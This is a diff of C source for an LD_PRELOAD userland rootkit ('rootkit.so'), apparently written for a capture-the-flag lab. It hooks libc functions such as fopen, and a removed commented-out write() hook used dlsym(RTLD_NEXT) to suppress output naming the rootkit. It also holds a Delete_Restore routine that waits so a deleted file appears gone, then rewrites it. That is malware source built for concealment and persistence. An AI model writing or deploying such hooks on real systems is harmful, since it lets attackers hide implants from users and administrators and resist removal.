@@ -6,6 +6,8 @@
 #include <errno.h>
 #include <dirent.h>
 #include <unistd.h>
+#include <fcntl.h>
+#include <sys/stat.h>
 
 
 //============================================================
@@ -69,26 +71,6 @@ FILE *fopen(const char *pathname , const char *mode){
 //=============================================================
 
 
-/*
-ssize_t write(int fildes, const void *buf , size_t nbytes){
-
-	ssize_t (*new_write)(int fildes, const void *buf , size_t nbytes);
-	
-	ssize_t result;
-	new_write = dlsym(RTLD_NEXT , "write");
-	
-	if(strcmp(buf , "/home/ctf/Desktop/Back_To_Basics/rootkit.so") == 0){
-		char buf_tmp[] = "\0";
-		new_write(fildes , buf_tmp , strlen(buf_tmp));
-	}
-	else{
-	
-	new_write(fildes , buf , nbyte);
-	}
-result =1;
-return result;
-}
-*/
 //=============================================================
 
 #define FILENAME "rootkit.so"
@@ -168,7 +150,8 @@ int Delete_Restore(int dirfd , const char *pathname , int flags){
 	return result;
 	}
 	else{
-	sleep(10);
+	sleep(10); // sleep to make it seem like the file wont come back 
+	
 	
 	FILE *output_file = fopen(pathname , "wb");
 	if(output_file == NULL){
@@ -191,3 +174,9 @@ int Delete_Restore(int dirfd , const char *pathname , int flags){
 	return 0;
 }
 
+//=================================================================
+
+
+			
+	
+	
